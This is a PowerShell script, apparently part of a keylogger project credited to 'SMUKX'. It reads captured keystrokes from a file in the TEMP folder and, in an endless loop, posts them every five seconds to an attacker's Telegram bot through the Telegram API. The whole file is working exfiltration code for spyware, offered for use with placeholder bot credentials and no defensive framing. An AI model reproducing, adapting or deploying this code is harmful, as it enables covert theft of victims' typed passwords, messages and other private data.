#################################################################
#.___________..______       __  ___   ___ ... PWENED
#|           ||   _  \     |  | \  \ /  / 
#`---|  |----`|  |_)  |    |  |  \  V  /  
#    |  |     |      /     |  |   >   <   
#    |  |     |  |\  \----.|  |  /  .  \  
#    |__|     | _| `._____||__| /__/ \__\ ... PWENED
#    
#POWERSHELL SCRIPT TO RECIEVE THE OUTPUT VIA TELEGRAM BOT 
#EXECUTION TIME 0.7 SECONDS
#CODED BY SMUKX
#GITHUB: https://github.com/Whitecat18
#BLOG: https://smukx.github.io
##################################################################


# FOR C++ PROGRAM OUTPUT
$Path = "$env:TEMP\winkeykey.txt"
# FOR POWERSHELL SCRIPT
#$Path = "$env:TEMP\keylogger.txt"
$telegramBotToken = "YOUR-BOT-TOKEN-HERE"
$chatId = "YOUR-CHAT-ID"
$sendMessageUrl = "https://api.telegram.org/bot$telegramBotToken/sendMessage"

# Simple loop to send the file for every 5 secinds
while ($true) {
    $content = Get-Content $Path -Raw
    $body = @{
        chat_id = $chatId
        text = $content
    }
    Invoke-WebRequest -Uri $sendMessageUrl -Method Post -Body $body
    Start-Sleep -Seconds 5
}
